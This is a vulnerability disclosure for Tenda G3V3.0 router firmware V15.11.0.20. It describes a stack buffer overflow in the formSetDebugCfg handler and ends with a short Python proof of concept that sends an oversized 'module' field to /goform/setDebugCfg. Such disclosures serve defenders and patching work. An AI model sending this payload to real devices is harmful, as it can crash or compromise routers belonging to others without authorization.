## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3369.html

## Affected version

G3V3.0 V15.11.0.20

## Vulnerability details

The Tenda G3V3.0 V15.11.0.20 firmware has a stack overflow vulnerability in the `formSetDebugCfg` function. The `pEnable, pLevel, pModule` variable receives the `enable, level, module` parameter from a POST request. However, since the user can control the input of `enable, level, module`, the statement

```c
sprintf(
    (char *)cmd,
    "echo enable=%s level=%s > /var/debug/%s",
    (const char *)pEnable,
    (const char *)pLevel,
    (const char *)pModule);
```

can cause a buffer overflow. The user-provided  `enable, level, module` can exceed the capacity of the `cmd` array, triggering this security vulnerability.

![image-20240417093917502](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417093917502.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/setDebugCfg"
payload = b"a"*2000

data = {
        'module':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```
